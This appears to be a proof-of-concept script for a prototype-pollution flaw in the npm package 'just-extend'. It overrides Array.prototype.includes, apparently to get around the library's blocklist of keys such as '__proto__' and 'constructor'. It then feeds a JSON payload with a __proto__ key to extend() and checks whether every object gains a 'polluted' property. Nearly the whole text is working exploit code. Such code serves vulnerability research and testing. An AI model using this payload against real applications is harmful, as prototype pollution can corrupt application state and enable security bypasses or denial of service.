Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const extend = require('just-extend');
let obj = {};
console.log({}.polluted);
let payload2 = JSON.parse('{"__proto__": {"polluted": "yes"}}');
extend(true, {}, payload2);
console.log({}.polluted);